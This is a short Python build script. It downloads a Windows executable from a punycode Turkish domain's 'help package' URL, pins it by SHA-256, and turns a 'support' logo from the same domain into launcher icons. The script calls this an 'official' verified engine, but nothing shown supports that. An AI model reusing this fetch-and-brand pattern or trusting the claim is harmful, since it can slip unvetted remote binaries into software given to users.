#!/usr/bin/env python3
"""Fetch only pinned public build inputs; no signing keys or client data."""
import hashlib,io,urllib.request
from pathlib import Path
from PIL import Image
root=Path(__file__).resolve().parent/'launcher'
seed=root/'seed/engine.exe';seed.parent.mkdir(exist_ok=True)
if not seed.exists():
 with urllib.request.urlopen('https://xn--bakm-nza.tr/yardim-paket.php?platform=windows&versionCode=2026111001',timeout=60) as r:seed.write_bytes(r.read(28879873))
assert seed.stat().st_size==28879872
assert hashlib.sha256(seed.read_bytes()).hexdigest()=='d9ec96f4c8b6fa14e95e5aec4dc8998c84072ec470f088bd6b84f481092835a1'
with urllib.request.urlopen('https://xn--bakm-nza.tr/assets/support/bakim-tr-yardim.png',timeout=30) as r:logo=r.read()
assert hashlib.sha256(logo).hexdigest()=='15376c8269a492373124b6ca38a9f7103f6d25e9f25afe3add1b0b67c7a7738e'
Image.open(io.BytesIO(logo)).convert('RGBA').save(root/'resource-icon.ico',format='ICO',sizes=[(16,16),(24,24),(32,32),(48,48),(64,64),(128,128),(256,256)])
im=Image.open(io.BytesIO(logo)).convert('RGBA');im.thumbnail((256,256));im.save(root/'resource-icon.png');im.resize((16,16),Image.Resampling.LANCZOS).save(root/'resource-icon16.png')
print('Original verified engine and official branded icon pinned by SHA256')
